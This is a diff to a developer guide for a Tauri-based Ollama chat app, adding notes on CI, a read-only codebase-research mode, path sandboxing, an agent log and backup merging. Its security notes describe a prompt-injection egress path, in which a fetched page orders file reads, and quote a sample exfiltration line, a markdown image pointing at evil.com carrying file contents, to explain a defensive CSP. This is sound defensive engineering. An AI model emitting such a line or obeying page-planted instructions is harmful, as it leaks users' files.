@@ -13,6 +13,11 @@ npm test           # Vitest in watch mode (jsdom, Tauri APIs mocked)
 npm run test:run   # Vitest single run (use this in CI / pre-commit)
 npm run test:rust  # Cargo tests for the Tauri backend
 npm run test:all   # Both test suites sequentially
+npm run lint       # cargo fmt --check + clippy --all-targets -- -D warnings. There is
+                   # no JS linter — this is all of "the lint" for this repo.
+npm run check      # lint + Vitest + `cargo check --all-targets`. The pre-push gate:
+                   # `cargo check` is what catches a missing/renamed symbol, which
+                   # `tauri dev`'s watcher only surfaces if it happens to rebuild.
 ```
 
 ### Prerequisites
@@ -20,6 +25,11 @@ npm run test:all   # Both test suites sequentially
 - **Rust**: Install via [rustup](https://rustup.rs/) (`rustup stable`)
 - **Tauri CLI**: `npm install` pulls `@tauri-apps/cli`
 - **Icons**: Generate with `cargo tauri icon path/to/source.png` (1024x1024 recommended)
+- **macOS/Xcode**: any link step fails with "You have not agreed to the Xcode license agreements" until `sudo xcodebuild -license accept` is run once. `cc --version` reproduces it in one line — don't go looking in the Rust code for it.
+
+### Three `cargo test` failures that are not your fault
+
+`test_load_sessions_from_existing_db`, `test_session_serialization`, and `test_serialization_matches_frontend` read the **legacy Electron-era DB** (`dirs_next()` → `~/Library/Application Support/Luma`) and assert it has sessions. On a machine whose chats live in `app_data_dir()` (`com.luma.chat`), that legacy file has 0 rows, so they fail on `sessions[0]` / `!sessions.is_empty()` regardless of the code. Everything else in `cargo test` passing is the signal; these three are environment-dependent. `ci.yml` skips exactly these three by name (they fail on any clean machine, so CI can still run the suite).
 
 ## Architecture
 
@@ -59,7 +69,7 @@ New commands: add the function in `commands.rs` and register it in `lib.rs`'s `t
 | `src/components/SidePanel.jsx` | Side-chat tabs + `+` button to add a new tab |
 | `src/lib/ollama.js` | `streamChat()` coordinates the tool-calling loop. `toolCallLimit` setting (0 = unlimited) caps rounds; once hit, the final round runs tools-disabled but keeps gathered tool results so the model still answers from them |
 | `src/lib/ollamaStream.js` | Pure collaborators extracted from `streamChat`: `applyStreamLine` (parses one streamed JSON line), `normalizeToolCalls`, `systemMessagesForRound` (force-final/wrap-up/web-search-nudge policy), `buildRequestBody`, `stripLeakedToolCallXml`, `runToolCalls` (executes a batch, detects quota/all-failed) |
-| `src/lib/tools.js` | `TOOLS` (Ollama-format definitions) + `executeTool(name, args)` dispatcher |
+| `src/lib/tools.js` | `TOOLS` (Ollama-format definitions) + `FILE_TOOL_NAMES`/`WEB_TOOL_NAMES` + `executeTool(name, args, context)` dispatcher. `context.roots` is the attached project folders for the file tools — the model can never supply them. Coerces stringly-typed args (`"limit": "50"`) because a type mismatch would fail the whole invoke and count as a failed tool round |
 | `src/lib/followups.js` | Follow-up subtopic generation: `buildFollowUpMessages` (focused JSON-only prompt) + `parseSubtopics` (robust extraction of ```json fences / prose-wrapped JSON, caps at 3) |
 | `src/lib/db.js` | Thin `invoke()` wrappers for every Tauri DB command |
 | `src/hooks/useStreamingChat.js` | Wires `streamChat` callbacks to store actions; creates the session on first message |
@@ -72,7 +82,7 @@ Independent stores, none persisted to `localStorage` (SQLite is the persistence 
 
 | Store | File | Owns | Re-render triggers |
 |---|---|---|---|
-| `useMainChat` | `src/store/chatStore.js` | Per-pane messages, streaming state, tool call records, model, `chatNonce` | `messages`, `isStreaming`, `model`, `error` (not `abortController`) |
+| `useMainChat` | `src/store/chatStore.js` | Per-pane messages, streaming state, tool call records, model, `chatNonce`, `projectRoots` | `messages`, `isStreaming`, `model`, `error` (not `abortController`) |
 | `getSideChatStore(id)` | `src/store/chatStore.js` | Same factory as `useMainChat`, one store per side-chat tab, kept in a `Map` keyed by tab id (never recreated on tab switch) | Same as above |
 | `useSessionStore` | `src/store/sessionStore.js` | Session list (incl. side-chat metadata), chat data write-through to SQLite | `chatSessions`, `activeChatId` |
 | `useUiStore` | `src/store/uiStore.js` | Transient view state: side-chat open/closed, Ollama connectivity, settings page open, side-chat prefill text | All fields (small UI-only store) |
@@ -102,11 +112,34 @@ A `maxSearches` budget (default 15, 0 = unlimited; `streamChat` param) counts `w
 
 `src/lib/tools.js` exports `TOOLS` + `executeTool(name, args)`. Local tools (e.g. `get_current_time`) run in the renderer; web tools (`web_search`, `web_fetch`) invoke Tauri commands (CORS), implemented in `tauri/src/tools/`.
 
-Web search has a global default in `useSettingsStore` (`webSearchDefault`, **off** by default); the per-pane toggle in `ChatPane` seeds from it as a session override. `useStreamingChat` filters web tools out of `TOOLS` when the toggle is off.
+Web search has a global default in `useSettingsStore` (`webSearchDefault`, **off** by default); the per-pane toggle in `ChatPane` seeds from it as a session override. `useStreamingChat` filters web tools out of `TOOLS` when the toggle is off. **In Codebase mode the default is off whatever the setting says**: file reads plus web access is the egress pair (a fetched page can order a file read, and a file can leave inside a URL), so `ChatPane` re-derives the toggle when the root set changes, and turning web search back on mid-codebase is a deliberate act. `ChatPane` derives `codebase` exactly as `useStreamingChat` does — the pane's roots, else its session's — because a side chat has no roots of its own and the two must agree or the default silently doesn't apply.
+
+### Codebase mode (read-only project research)
+
+Attaching a project folder turns a session into Codebase mode. **Mode is derived, not stored**: `sessions.project_roots IS NOT NULL` means codebase, so attaching a folder is the only switch — there's no `mode` column, no per-pane toggle, and no default-mode setting. Detaching returns the pane to chat. Side chats inherit it (they read their session's roots via the fallback in `useStreamingChat`) and have no control of their own.
+
+`tauri/src/tools/fs.rs` owns the whole feature: `read_file(path, offset?, limit?)`, `search_code(query, path?, glob?, output?, regex?, no_ignore?)`, `list_dir(path?)`, plus `validate_project_root`. Pure functions over `&[PathBuf]` (no Tauri context) so the guard is unit-testable; `commands.rs` only adds `spawn_blocking` (the first `spawn_blocking` in the repo).
+
+- **The root set is the security boundary.** Paths are relative only and resolve against the **primary** root only (naming a secondary root waits for the `root` parameter; a flat namespace would be ambiguous), then Rust joins to that root, canonicalizes *both* the root and the target, and checks component-wise `Path::starts_with`. `validate_project_root` gates attaching, and the same denylist (`fs.rs`'s `refused_as_root`: `/`, `$HOME`, `$HOME`'s parent, a file, Luma's own data dir and any ancestor of it) is **re-applied on every call** by `commands.rs`'s `roots_to_paths` — the DB is not a trusted source for a root, because `import_chats` writes a backup's roots straight into it. That per-call check is `is_refused_root`, not `validate_root`: a root restored on another machine legitimately points at a folder that isn't here, and has to be *kept* (the UI marks it missing), so the check can't require existence. `RootSet::new` also drops the filesystem root and overlapping roots (first attached wins).
+- **Observations vs `Error:`** — see the `Error` prefix note in the streaming section. Expected path failures (not found, symlink escape, binary, past EOF, timeout, **a directory handed to `read_file`**) return as plain observations so `allFailed` doesn't trip. That last one is a real trap: on Unix `File::open` opens a directory happily and only fails later with `EISDIR`, which surfaces as an infrastructure `Error:` unless you `metadata().is_dir()` first. `fs.rs`'s module docs spell this out; keep it that way for new tools.
+- **Caps are applied before loading**, never `read_to_string` then truncate: per-line 2000 chars, 2000 lines, ~150 KB per read result; search caps 20/file and 100 total. `read_file` emits `{line}→{text}` with real line numbers and a `continue with offset=N` notice. Past the requested window it reads on only for the notice's line count, so the deadline has to **end the read** (the notice degrades to "more than N lines") — otherwise a multi-GB log is streamed to EOF for one sentence. Lines are decoded only when emitted, and **lossily**: a stray byte before `offset`, or a multi-byte character cut in half by the per-line cap, must not fail a read whose window is fine, so the NUL peek is the only thing that refuses a file.
+- **Search uses ripgrep's libraries** (`ignore` + `grep-searcher` + `grep-regex`), literal by default with `regex::escape`, smart-case, `.gitignore` respected unless `no_ignore` (which also includes hidden files). It sets `require_git(false)` so a folder's own `.gitignore` applies even outside a checkout, and `parents(false)` so ignore files *above* the attached folder don't. Results are sorted by path (`WalkBuilder::sort_by_file_path`) so a capped result set is deterministic instead of readdir-ordered, and `content`/`files` **break the walk** once the cap is full rather than opening every remaining file until the deadline (which would also add a bogus "timed out" notice). Walk timeout is checked **inside** the loop (partial results + notice), never by abandoning a running thread.
+- **Loop policy differs in Codebase mode** (`useStreamingChat` passes these to `streamChat`): `maxToolRounds: 20`, `webSearchNudgeAt: null` (the round-15 DuckDuckGo nudge fires on the round number alone, so it would otherwise interrupt repo reading), `maxFileCalls: 40`, `maxFileBytes: 150000`. `toolCallLimit` is unchanged — no separate hard cap, the budgets bound the spend.
+- `numCtx` and `temperature` are persisted settings (both were hardcoded in `buildRequestBody`). **Codebase mode sizes `num_ctx` itself**, in `src/lib/modelContext.js`: two signals doing two jobs — the `cloud` tag suffix decides *permission to raise* (cloud context is ollama.com's memory; a local model's is the user's VRAM, where a big KV cache means CPU offload or a model that won't load), and the model's real window from `ollama_model_context` (`/api/show` → `model_info['<arch>.context_length']`) decides *the ceiling*, capped at `CODEBASE_MAX_CTX` (65536). It only ever raises, never lowers, and an unreadable window means no raise — exceeding the trained length degrades quality silently via RoPE scaling rather than erroring. `stream.start` in the agent log records the resolved `numCtx`, the setting it came from, and the window. Attaching while `ollamaUrl` isn't loopback shows a one-time notice that file contents leave the machine (`projectRemoteNoticeAck`).
+
+### Agent log (tuning the harness)
+
+`src/lib/agentLog.js` writes a structured **JSONL** record of what the agent loop did — opt-in via the `agentLogEnabled` setting (Settings → Agent log), a no-op object when off. The log is the only way to tune the loop from evidence: it captures the harness's *decisions* (the prompt, the tools offered, which policy message fired on which round, the resolved limits) alongside the model's behaviour (per-round content/thinking sizes and latency, every tool call with args, verdict, timing and result size, budget counters) and the reason each run ended.
+
+- **Rust only appends.** `append_agent_log(lines)` / `agent_log_path()` / `clear_agent_log()` in `commands.rs` are dumb: the frontend hands over already-serialized lines, so a new event type needs no backend change. Written to `<app_data_dir>/logs/agent.jsonl`, rotated to `agent.1.jsonl` past 5 MB.
+- **Events** (`t`): `limits`, `stream.start`, `round.start` (with `injected`, naming the policy message via `messageKind`), `round.reply`, `tool`, `round.end`, `stream.end` (always written, from the loop's `finally`, with `reason`: `final` / `quota` / `abort` / `error`), `stream.error`, `subtopics`.
+- **Flushes per round**, not per event, and swallows its own write errors — logging must never fail a chat turn.
+- **Results are summarised, never copied**: `chars` + head 400 + tail 200. The tail is deliberate — `read_file` puts its "continue with offset=N" notice at the *end*. Roots are logged by basename, not absolute path, since the file may be shared.
+- `classifyToolResult` (ollamaStream.js) is exported so the log reports the same verdict the loop acted on.
 
 ### Database schema
 
-`tauri/src/db.rs` owns schema + queries (SQLite via `rusqlite`, synchronous). Tables: `sessions`, `messages`, `side_chats`, `side_chat_messages`, `custom_models`, `settings` (key/value; well-known keys in `SETTING_KEYS`, `src/store/settingsStore.js`). Message rows store `images`/`tool_calls` as JSON strings.
+`tauri/src/db.rs` owns schema + queries (SQLite via `rusqlite`, synchronous). Tables: `sessions`, `messages`, `side_chats`, `side_chat_messages`, `custom_models`, `settings` (key/value; well-known keys in `SETTING_KEYS`, `src/store/settingsStore.js`). Message rows store `images`/`tool_calls` as JSON strings, and `sessions.project_roots` holds a JSON array of attached project folders (`NULL` = an ordinary chat session). Roots have their own `set_project_roots` command so a title/model edit can never clobber them, and `import_all` merges them with `COALESCE(local, backup)`.
 
 Migrations use SQLite's `PRAGMA user_version`: `MIGRATIONS` in `db.rs` is an ordered array of steps, and `run_migrations()` only runs steps above the DB's current version, then advances it — so each step runs at most once. New schema changes: append a step, wrapped in `.ok()`; never edit or reorder existing steps (their position is their version number).
 
@@ -116,7 +149,7 @@ Migrations use SQLite's `PRAGMA user_version`: `MIGRATIONS` in `db.rs` is an ord
 
 ### Chat backup / restore
 
-`export_chats(path)`/`import_chats(path)` (`commands.rs`) back up **chat data only** (sessions, messages, side chats) — no settings/custom models/API keys. File format is a custom `.lumabackup` container: 4-byte magic (`LMBK`) + 1-byte version + gzip-compressed compact JSON (via `flate2`, already pulled in transitively by `reqwest`). `encode_backup`/`decode_backup` are pure functions (no `State`) for unit testing without a Tauri context. `import_all` preserves the backup's original `created_at`/`updated_at` (unlike `save_session`, which stamps "now") and upserts by id — it's a restore/merge, not additive-only.
+`export_chats(path)`/`import_chats(path)` (`commands.rs`) back up **chat data only** (sessions, messages, side chats) — no settings/custom models/API keys. File format is a custom `.lumabackup` container: 4-byte magic (`LMBK`) + 1-byte version + gzip-compressed compact JSON (via `flate2`, already pulled in transitively by `reqwest`). `encode_backup`/`decode_backup` are pure functions (no `State`) for unit testing without a Tauri context. `import_all` preserves the backup's original `created_at`/`updated_at` (unlike `save_session`, which stamps "now") and upserts by id — it's a restore/merge, not additive-only. Project roots are part of that merge: a session already attached on this machine keeps its own (real, existing) folders, and one with no attachment adopts the backup's — which is the cross-machine case, where those paths usually don't exist and get marked missing in the UI instead of failing the import.
 
 Frontend uses `@tauri-apps/plugin-dialog`'s `save()`/`open()` for the native picker, then passes the path to the Tauri commands which do the file I/O via `std::fs`.
 
@@ -161,7 +194,8 @@ Concrete entry points for changes that come up often. Skim this list before grep
 - **Add a new Tauri command** — add to `commands.rs`, register in `lib.rs`'s `generate_handler![]`, mirror a wrapper in `src/lib/db.js`/`src/lib/tools.js`. For long-running streams, follow the `ollama_chat_stream` event pattern (`ollama://chunk`/`done`/`error`, keyed by `request_id`).
 - **Add a new persisted setting** — add to `SETTING_KEYS` in `settingsStore.js`; write-through to SQLite is automatic. Schema changes: append a `MIGRATIONS` step in `db.rs` (never edit/reorder existing ones).
 - **Ollama server URL + API key** — `ollamaUrl`/`ollamaApiKey` in `useSettingsStore`, passed to `ollama_reachable`/`ollama_list_models`/`ollama_chat_stream` as `ollama_url`/`api_key` (fallback via `resolve_ollama_base()`). `ollamaApiKey` is unified across the remote-server bearer token and the web search API.
-- **Add a new tool the model can call** — schema in `TOOLS` (`src/lib/tools.js`) + a case in `executeTool`. Web tools must run as Tauri commands (CORS); local tools run in the renderer.
+- **Add a new tool the model can call** — schema in `TOOLS` (`src/lib/tools.js`) + a case in `executeTool`. Web tools must run as Tauri commands (CORS); local tools run in the renderer. Read-only file tools belong in `tauri/src/tools/fs.rs` and must return expected failures as **observations**, never `Error:`-prefixed strings (see the `allFailed` note above).
+- **Attach a project folder (Codebase mode)** — `ChatPane`'s folder button → `open({ directory: true })` → `db.validateProjectRoot` (Rust gates `/`, `$HOME`, Luma's data dir) → `store.setProjectRoots` (pane) + `sessionStore.setProjectRoots` (persisted). `chatStore.loadMessages` takes the session's roots so switching sessions can't leak one project into the next; a side chat reads its session's instead. `numCtx` needs to be ≥32768 for this to be useful.
 - **Add a native save/open file dialog** — `@tauri-apps/plugin-dialog`'s `save()`/`open()` for the path, then a plain Tauri command doing `std::fs` I/O (see `export_chats`/`import_chats`). Add permissions to `tauri/capabilities/default.json`.
 - **Add a copy button to markdown code blocks** — the `code` override inside `buildMarkdownComponents` in `MarkdownBody.jsx` is the place. Because the override now uses React hooks (`useState` for copied feedback), `MarkdownBody` must memoize the `components` object with `useMemo(..., [theme])` so React doesn't treat it as a new component type on every render. Add `paddingRight` to the `<pre>` so the button doesn't overlap long single-line code.
 - **Add a test** — Vitest + jsdom, Tauri APIs mocked in `src/test/setup.ts`, matching `src/**/*.test.{js,jsx,ts,tsx}`. Prefer `npm run test:run` over `npm test`.
@@ -186,6 +220,7 @@ Concrete entry points for changes that come up often. Skim this list before grep
 - **After bumping `package.json`, run `npm install` (not a hand-edit)** so `package-lock.json`'s two `version` fields update too.
 - **This machine's `~/.npmrc` sets `legacy-peer-deps=true` globally**, which hides lockfile issues that CI's strict `npm ci` will fail on (`EUSAGE`/"Missing: X from lock file"). Reproduce CI before tagging with `rm -rf node_modules && npm ci --no-legacy-peer-deps`; regenerate the lockfile with `npm install --no-legacy-peer-deps` if it fails.
 - **Releases are CI-driven**: `.github/workflows/release.yml` builds and publishes a draft release on any `v*` tag push. A `check-main` job gates `release` on the tagged commit being reachable from `origin/main` (`git merge-base --is-ancestor`), so cut tags from `main` (merge `develop` in first).
+- **`.github/workflows/ci.yml` is the PR/push gate** (PRs, and pushes to `main`/`develop`): `npm run check`, then `cargo test` minus the three environment-dependent tests, which it skips by name. It needs the Linux webkit stack installed even for `cargo check`, since tauri's build scripts probe for it.
 - `CHANGELOG.md` is hand-maintained — update it in the same commit as the version bump, sourced from `git log <prev-tag>..HEAD --oneline`.
 
 ## Tauri / WebView pitfalls
@@ -193,9 +228,10 @@ Concrete entry points for changes that come up often. Skim this list before grep
 - **Don't use `display: none` to hide simultaneously-mounted panes.** In WKWebView, a textarea transitioning `display: none` → `flex` renders but won't accept click-to-focus. Use `visibility: hidden; pointer-events: none` with absolute-position stacking instead (see `SidePanel.module.css`'s `.tabPane`/`.tabPaneActive`).
 - **CSS module changes may not hot-reload in the Tauri dev window.** A full restart sometimes picks up what HMR reports as applied but isn't.
 - **Unsigned macOS builds are Gatekeeper-blocked on download.** Users must run `xattr -cr /path/to/Luma.app` before opening (worse on arm64). Proper fix needs an Apple Developer account + signing config.
-- **The WebView has no CSP (`"csp": null`) and `MarkdownBody` has no `img` override**, so a remote image URL in model output (`![](https://…?d=…)`) is fetched automatically on render — no tool call, no click. Keep that in mind for anything that puts untrusted content (web pages, file contents) into a context: markdown rendering is an egress channel, and the URL persists in `messages.content`.
+- **The WebView CSP only allows self/data/blob images** (`app.security.csp` in `tauri.conf.json`). A remote image URL in model output is *not* fetched. This is deliberate: markdown rendering is an exfiltration channel (a model reply of `![](https://evil.com/?d=<file contents>)` is fetched automatically on render, and the URL persists in `messages.content`, so it would re-fire on reload or when a folder is detached). The app's only `<img>` tags (`MessageBubble`, `InputArea`) use `data:` URLs and `assetProtocol` isn't enabled, so nothing the UI renders breaks — the cost is remote images in chat markdown. Keep that in mind for anything that puts untrusted content (web pages, file contents) into a context, and add `img-src` sources deliberately if remote images are ever wanted.
 
 ## Editor tooling
 
 - **Ignore Prettier-only churn in diffs.** The editor's file-write tool reformats the whole file on save; don't revert those hunks, just focus on the semantic change.
-- **Verify UI/CSS tweaks with a throwaway HTML repro, not the repo.** Build a minimal standalone HTML mirroring the global reset + bubble + `markdownBody`, screenshot via Playwright MCP, and write both to `/tmp` — not the repo root, since the screenshot tool defaults there and the commit hook auto-stages untracked files. Check `git show --stat HEAD` after committing to catch stray screenshots.
+- **Verify UI/CSS tweaks with a throwaway HTML repro, not the repo.** Build a minimal standalone HTML mirroring the global reset + bubble + `markdownBody`, screenshot via Playwright MCP, and write both to `/tmp` — not the repo root, since the screenshot tool defaults there and a stray file lands in the commit (there is **no** pre-commit hook here; `.git/hooks/` holds only samples and `core.hooksPath` is unset, so `git add -A` is what sweeps it up). Check `git show --stat HEAD` after committing to catch stray screenshots.
+- **Do a symbol and its call site in one edit (or define it first).** `tauri dev`'s watcher can rebuild between two edit steps and surface a transient `E0425 … not found in this scope` that isn't real — `npm run check` is the honest signal, not the watcher's output.
